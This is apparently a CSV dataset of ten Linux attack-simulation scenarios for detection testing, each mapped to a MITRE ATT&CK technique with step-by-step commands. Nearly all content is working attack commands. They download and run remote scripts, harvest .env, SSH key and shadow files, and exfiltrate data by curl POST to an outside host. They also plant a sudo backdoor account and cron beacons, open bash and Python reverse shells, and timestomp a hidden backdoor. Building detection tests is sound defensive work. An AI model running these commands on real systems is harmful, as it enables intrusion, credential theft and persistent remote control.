id,name,description,platform,attack_type,mitre_technique_id,mitre_technique_name,complexity,simulation_steps,expected_detections,tags
LIN-CLI-001,PowerShell Command Execution,Download and execute a PowerShell stager script on Linux to collect and exfiltrate file metadata,linux,execution,T1059.001,PowerShell,low,"[{""order"":1,""role"":""cli"",""command"":""pwsh -NoProfile -ExecutionPolicy Bypass -Command \""Invoke-WebRequest -Uri 'http://cdn-update.s3.amazonaws.com/update-check.ps1' -OutFile '/tmp/.cache-update.ps1'; . /tmp/.cache-update.ps1\"""",""description"":""Download and execute a PowerShell script from a remote endpoint"",""expected_artifact"":""pwsh process with remote download"",""timeout_seconds"":30},{""order"":2,""role"":""cli"",""command"":""pwsh -NoProfile -Command \""\\$d = Get-ChildItem /home -Recurse -Include *.csv,*.env,*.pem -ErrorAction SilentlyContinue | Select-Object FullName,Length; \\$d | ConvertTo-Json | Out-File /tmp/.diag-output.json\"""",""description"":""Enumerate sensitive files and write results to a hidden JSON file"",""expected_artifact"":""file enumeration via PowerShell"",""timeout_seconds"":30},{""order"":3,""role"":""cli"",""command"":""pwsh -NoProfile -Command \""Get-Content /tmp/.diag-output.json | ForEach-Object { Invoke-RestMethod -Uri 'http://cdn-update.s3.amazonaws.com/api/telemetry' -Method Post -Body \\$_ }\"""",""description"":""Exfiltrate collected file metadata to the remote endpoint"",""expected_artifact"":""HTTP POST exfiltration via PowerShell"",""timeout_seconds"":30}]","[""powershell_execution"",""suspicious_process"",""network_connection_from_pwsh""]","[""atomic-red-team"",""execution""]"
LIN-CLI-002,System Information Discovery,Living-off-the-land reconnaissance to identify the host and map the network for lateral movement,linux,discovery,T1082,System Information Discovery,low,"[{""order"":1,""role"":""cli"",""command"":""cat /etc/hostname && uname -r && cat /etc/os-release | head -5"",""description"":""Identify the host OS and kernel version"",""expected_artifact"":""host identification commands"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""ip route show && ip addr show eth0 && cat /etc/resolv.conf"",""description"":""Map the network topology for lateral movement"",""expected_artifact"":""network enumeration"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""cat /etc/passwd | grep -v nologin | grep -v false && last -5 && who"",""description"":""Find active user accounts and recent login activity"",""expected_artifact"":""user account enumeration"",""timeout_seconds"":10}]","[""system_discovery"",""reconnaissance""]","[""discovery"",""native-tools""]"
LIN-CLI-003,File and Directory Discovery,Targeted search for credential files and sensitive data worth exfiltrating,linux,discovery,T1083,File and Directory Discovery,low,"[{""order"":1,""role"":""cli"",""command"":""find /home -maxdepth 4 -type f \\( -name '.env' -o -name '*.pem' -o -name 'id_rsa' -o -name '.git-credentials' \\) 2>/dev/null"",""description"":""Hunt for secrets and credential files"",""expected_artifact"":""file search for credentials"",""timeout_seconds"":30},{""order"":2,""role"":""cli"",""command"":""find /home -maxdepth 4 -type f -size +100k \\( -name '*.csv' -o -name '*.sql' -o -name '*.xlsx' \\) 2>/dev/null"",""description"":""Find large data files worth exfiltrating"",""expected_artifact"":""file search for valuable data"",""timeout_seconds"":30},{""order"":3,""role"":""cli"",""command"":""ls -la /home/user/.ssh/ && cat /home/user/.bash_history | tail -30"",""description"":""Check for SSH keys and review recent command history"",""expected_artifact"":""SSH key and history access"",""timeout_seconds"":10}]","[""file_discovery"",""sensitive_file_access""]","[""discovery"",""native-tools""]"
LIN-CLI-004,Create Local Account for Persistence,Create a backdoor user account disguised as a system service for persistent access,linux,persistence,T1136.001,Create Local Account,medium,"[{""order"":1,""role"":""cli"",""command"":""id syslog-ng &>/dev/null && userdel -r syslog-ng 2>/dev/null; useradd -m -s /bin/bash -c 'Syslog NG Service' syslog-ng"",""description"":""Create a backdoor account with a service-like username"",""expected_artifact"":""syslog-ng user in /etc/passwd"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""echo 'syslog-ng:Kx9mP2qL5r' | chpasswd"",""description"":""Set password for the backdoor account"",""expected_artifact"":""password change event"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""usermod -aG sudo syslog-ng && echo 'syslog-ng ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/syslog-ng"",""description"":""Grant sudo privileges and add NOPASSWD sudoers entry"",""expected_artifact"":""sudoers modification"",""timeout_seconds"":10}]","[""account_creation"",""privilege_escalation"",""sudoers_modification""]","[""persistence"",""atomic-red-team""]"
LIN-CLI-005,Cron Job Persistence,Install persistence via cron disguised as a system maintenance task that exfiltrates env files,linux,persistence,T1053.003,Cron,medium,"[{""order"":1,""role"":""cli"",""command"":""printf '#!/bin/bash\\ncurl -s http://cdn-update.s3.amazonaws.com/api/health -o /dev/null\\nfind /home -name \""*.env\"" -newer /tmp/.last-check -exec curl -s -X POST -d @{} http://cdn-update.s3.amazonaws.com/api/telemetry \\\\;\\ntouch /tmp/.last-check\\n' > /var/tmp/.apt-daily-upgrade && chmod +x /var/tmp/.apt-daily-upgrade"",""description"":""Create a beacon script disguised as apt maintenance"",""expected_artifact"":""/var/tmp/.apt-daily-upgrade"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""(crontab -l 2>/dev/null; echo '*/15 * * * * /var/tmp/.apt-daily-upgrade >/dev/null 2>&1') | crontab -"",""description"":""Install the script as a recurring cron job"",""expected_artifact"":""crontab modification"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""crontab -l && ls -la /var/tmp/.apt-daily-upgrade"",""description"":""Verify cron installation and script presence"",""expected_artifact"":""crontab list and file stat"",""timeout_seconds"":10}]","[""cron_persistence"",""scheduled_task"",""hidden_script""]","[""persistence"",""atomic-red-team""]"
LIN-CLI-006,Credential Dumping from Files,Targeted credential harvesting from shell history and config files after gaining a foothold,linux,credential_access,T1003.008,/etc/passwd and /etc/shadow,medium,"[{""order"":1,""role"":""cli"",""command"":""cat /home/user/.bash_history | grep -iE '(password|token|key|secret|mysql|psql|ssh)' 2>/dev/null | tail -20"",""description"":""Mine shell history for credential references"",""expected_artifact"":""history grep for credentials"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""find /home -maxdepth 3 -name '.env' -exec cat {} \\; 2>/dev/null && cat /home/user/.git-credentials 2>/dev/null && cat /home/user/.netrc 2>/dev/null"",""description"":""Grab config files with embedded secrets"",""expected_artifact"":""env and credential file reads"",""timeout_seconds"":30},{""order"":3,""role"":""cli"",""command"":""cat /etc/shadow 2>/dev/null || grep -r 'password' /home/user/.config/ 2>/dev/null | head -20"",""description"":""Attempt shadow file access or fall back to config directory search"",""expected_artifact"":""/etc/shadow read or config password grep"",""timeout_seconds"":30}]","[""credential_access"",""sensitive_file_read"",""history_mining""]","[""credential-access"",""atomic-red-team""]"
LIN-CLI-007,Data Exfiltration via curl,Stage sensitive files and exfiltrate via encoded upload to a cloud-like endpoint,linux,exfiltration,T1048.003,Exfiltration Over Unencrypted Non-C2 Protocol,high,"[{""order"":1,""role"":""cli"",""command"":""tar czf /tmp/.cache-thumbnails.tar.gz /home/user/fixtures/*.csv /home/user/fixtures/*.txt 2>/dev/null"",""description"":""Stage sensitive files into a disguised archive"",""expected_artifact"":""/tmp/.cache-thumbnails.tar.gz"",""timeout_seconds"":15},{""order"":2,""role"":""cli"",""command"":""base64 /tmp/.cache-thumbnails.tar.gz > /tmp/.cache-thumbnails.b64"",""description"":""Base64 encode the archive to evade content inspection"",""expected_artifact"":""base64 encoded archive"",""timeout_seconds"":15},{""order"":3,""role"":""cli"",""command"":""curl -s -X POST -H 'Content-Type: application/octet-stream' --data-binary @/tmp/.cache-thumbnails.b64 http://cdn-update.s3.amazonaws.com/api/upload 2>&1 || true"",""description"":""Exfiltrate encoded data via HTTP POST to a cloud-like endpoint"",""expected_artifact"":""HTTP POST to cdn-update.s3.amazonaws.com"",""timeout_seconds"":30}]","[""data_exfiltration"",""suspicious_network"",""base64_encoding""]","[""exfiltration"",""c2""]"
LIN-CLI-008,Reverse Shell Attempt,Establish a reverse shell using multiple techniques with persistent reconnection,linux,command_and_control,T1059.004,Unix Shell,high,"[{""order"":1,""role"":""cli"",""command"":""bash -c 'exec 5<>/dev/tcp/cdn-update.s3.amazonaws.com/443; cat <&5 | while read line; do eval \""$line\"" 2>&5 >&5; done &'"",""description"":""Attempt reverse shell via bash file descriptor technique"",""expected_artifact"":""outbound TCP connection via file descriptor"",""timeout_seconds"":15},{""order"":2,""role"":""cli"",""command"":""python3 -c \""import socket,subprocess,os;s=socket.socket();s.settimeout(5);s.connect(('cdn-update.s3.amazonaws.com',8443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""  &"",""description"":""Attempt Python-based reverse shell as fallback"",""expected_artifact"":""python3 reverse shell attempt"",""timeout_seconds"":15},{""order"":3,""role"":""cli"",""command"":""nohup bash -c 'while true; do bash -i >& /dev/tcp/cdn-update.s3.amazonaws.com/443 0>&1 2>/dev/null; sleep 300; done' &"",""description"":""Install persistent reconnecting reverse shell"",""expected_artifact"":""persistent reverse shell loop"",""timeout_seconds"":15}]","[""reverse_shell"",""c2_communication"",""persistent_backdoor""]","[""c2"",""high-severity""]"
LIN-CLI-009,Defense Evasion - Timestomp,Hide a backdoor script by timestomping it to match legitimate system files,linux,defense_evasion,T1070.006,Timestomp,medium,"[{""order"":1,""role"":""cli"",""command"":""cp /usr/bin/curl /var/tmp/.libpam-update && echo '#!/bin/bash' > /var/tmp/.libpam-update && echo 'curl -s http://cdn-update.s3.amazonaws.com/api/health -H \""X-Session: $(whoami)@$(hostname)\"" -o /dev/null' >> /var/tmp/.libpam-update && chmod +x /var/tmp/.libpam-update"",""description"":""Create a backdoor script disguised as a PAM library update"",""expected_artifact"":""/var/tmp/.libpam-update"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""touch -r /usr/lib/apt/apt.systemd.daily /var/tmp/.libpam-update"",""description"":""Timestomp the file to match a legitimate system file"",""expected_artifact"":""timestamp modification"",""timeout_seconds"":10},{""order"":3,""role"":""cli"",""command"":""stat /var/tmp/.libpam-update && stat /usr/lib/apt/apt.systemd.daily"",""description"":""Verify timestamps match the reference system file"",""expected_artifact"":""stat output showing matching timestamps"",""timeout_seconds"":10}]","[""timestomp"",""defense_evasion"",""hidden_backdoor""]","[""defense-evasion"",""atomic-red-team""]"
LIN-CLI-010,Process Injection via ptrace,Target running services for process inspection and memory analysis via ptrace,linux,privilege_escalation,T1055.008,Ptrace System Calls,high,"[{""order"":1,""role"":""cli"",""command"":""ps aux | grep -E '(sshd|nginx|apache|node|python)' | grep -v grep | head -5"",""description"":""Find interesting service processes to target for injection"",""expected_artifact"":""process enumeration"",""timeout_seconds"":10},{""order"":2,""role"":""cli"",""command"":""TARGET_PID=$(pgrep -o -f 'sshd|node|python' 2>/dev/null || echo 1) && strace -p $TARGET_PID -e trace=read,write -f -o /tmp/.debug-trace.log &"",""description"":""Attach strace to a running service process"",""expected_artifact"":""ptrace attach to service"",""timeout_seconds"":15},{""order"":3,""role"":""cli"",""command"":""TARGET_PID=$(pgrep -o -f 'sshd|node|python' 2>/dev/null || echo 1) && gdb -batch -ex \""attach $TARGET_PID\"" -ex \""info proc mappings\"" -ex \""detach\"" -ex \""quit\"" 2>&1 | head -20"",""description"":""Inspect process memory layout via GDB"",""expected_artifact"":""gdb ptrace attach and memory inspection"",""timeout_seconds"":15}]","[""process_injection"",""ptrace"",""memory_inspection""]","[""privilege-escalation"",""high-severity""]"
